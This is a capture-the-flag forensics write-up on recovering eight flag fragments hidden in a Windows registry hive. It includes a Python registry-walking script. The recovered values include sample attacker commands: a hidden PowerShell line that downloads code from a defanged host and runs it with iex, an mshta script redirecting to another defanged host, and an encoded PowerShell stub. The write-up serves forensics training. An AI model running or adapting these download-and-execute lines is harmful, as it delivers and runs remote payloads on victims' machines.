**Category**: Forensics  
**Author**: John Hammond

![](./files/01%20-%20Beyblade/01%20-%20Beyblade.png)

---

The challenge ZIP contained a single file named `beyblade`.

```
$ file beyblade
beyblade: MS Windows registry file, NT/2000 or above
```

The registry file contained thousands of entries. As I started dumping them, I got lucky and noticed this:

```
http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b
```

This gave me a rough idea of what to look for. I wrote the following script and then dug through the output by hand:

```Python
#!/usr/bin/env python3
from Registry import Registry
import re

def walk(reg, subkey, depth=0):
    key = reg.open("\\".join(subkey.path().split("\\")[1:]))
    
    for value in [v for v in key.values() if v.value_type() == Registry.RegSZ or v.value_type() == Registry.RegExpandSZ]:        
        if re.match(".*[-_=:]{1}[a-f0-9]{4}.*?", value.name()):
            print(value.name())
            print()
        
        if re.match(".*[-_=:]{1}[a-f0-9]{4}.*?", value.value()):
            print(value.value())
            print()
    
    for subkey in subkey.subkeys():
        walk(reg, subkey, depth + 1)

def main():
    reg = Registry.Registry("beyblade")
    walk(reg, reg.root())

if __name__ == "__main__":
    main()
```

After carefully going through the output from the above script, I was able to find all eight chunks in the following order:

- `http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b`
- `administrator|segment-8-of-8=58de`
- `C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a`
- `powershell.exe -e JABNAE0A; ## piece:4/8-b34a`
- `C:\Users\Public\fragment-5_of_8-0d9c`
- `powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb`
- `cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>`
- `Microsoft Management Console - component#7of8-99bb`

Flag: **flag{47cb5cd46d7bb34a0d9c315a99bb58de}**

---

**Files:**
- [beyblade.zip](./files//01%20-%20Beyblade/beyblade.zip)
- [extract.py](./files//01%20-%20Beyblade/extract.py)